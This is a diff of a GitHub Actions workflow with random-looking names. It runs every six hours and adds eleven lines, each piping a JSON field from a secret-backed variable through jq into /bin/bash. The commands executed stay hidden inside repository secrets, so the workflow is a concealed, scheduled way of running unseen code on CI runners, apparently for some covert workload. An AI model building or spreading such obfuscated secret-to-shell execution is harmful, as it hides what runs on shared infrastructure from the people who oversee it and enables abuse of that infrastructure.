@@ -3,20 +3,26 @@ name: laonayanyx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 2/6 * * *'
-jobs:  # 14631
+    - cron: '58 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: laonayanyx
         env:
-          myr6423: ${{ secrets.myr6423 }}
+          rcphr6450: ${{ secrets.rcphr6450 }}
         run: |
-          echo $myr6423 | jq -r .saic01 | /bin/bash
-          echo $dkzyl9097 | jq -r .uo644 | /bin/bash
-          echo $owzzq109 | jq -r .r47096 | /bin/bash
-          echo $m7 | jq -r .t8 | /bin/bash
-          echo $k0621 | jq -r .zwk01842 | /bin/bash
+          echo $rcphr6450 | jq -r .uvdi1383 | /bin/bash
+          echo $cgu724 | jq -r .cijv35584 | /bin/bash
+          echo $okpy73434 | jq -r .cev6427 | /bin/bash
+          echo $rosu145 | jq -r .tr7 | /bin/bash
+          echo $jols32558 | jq -r .sb74615 | /bin/bash
+          echo $m106 | jq -r .vuo58 | /bin/bash
+          echo $afy8784 | jq -r .zwg1870 | /bin/bash
+          echo $m05 | jq -r .frhsw483 | /bin/bash
+          echo $zbl98019 | jq -r .ovj3345 | /bin/bash
+          echo $o695 | jq -r .eg39 | /bin/bash
+          echo $k8 | jq -r .ahky5125 | /bin/bash
 
